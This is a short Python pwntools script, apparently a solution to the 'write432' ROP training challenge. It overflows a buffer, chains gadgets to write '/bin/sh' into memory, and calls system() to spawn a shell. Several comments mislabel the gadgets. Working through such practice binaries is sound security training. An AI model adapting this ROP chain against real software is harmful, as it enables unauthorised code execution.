from pwn import *
import time

pop2ret = 0x80486da # pip edi; pop ebp; ret;

system = 0x8048430
mov_edi_ebp = 0x8048670 # mov edi, [ebp]; ret
buffer_x = 0x804a044

context(os = 'linux', arch = 'i386') 
context.log_level = 'debug'

conn = process('./write432')

conn.recvuntil('> ')

p = 'A' * 44 
p += p32(pop2ret)  # edi <- buffer_x, ebp <- /bin
p +=  p32(buffer_x) 
p += '/bin'
p += p32(mov_edi_ebp) # edi <- /bin
p += p32(pop2ret) 
p += p32(buffer_x+4)  # edi <- buffer_x + 4, ebp <- /sh\x00
p += '/sh\x00'
p += p32(mov_edi_ebp) # edi <- system
p += p32(system)      # system 
p += 'BBBB' 
p += p32(buffer_x) 

conn.sendline(p)
time.sleep(1)
conn.interactive()
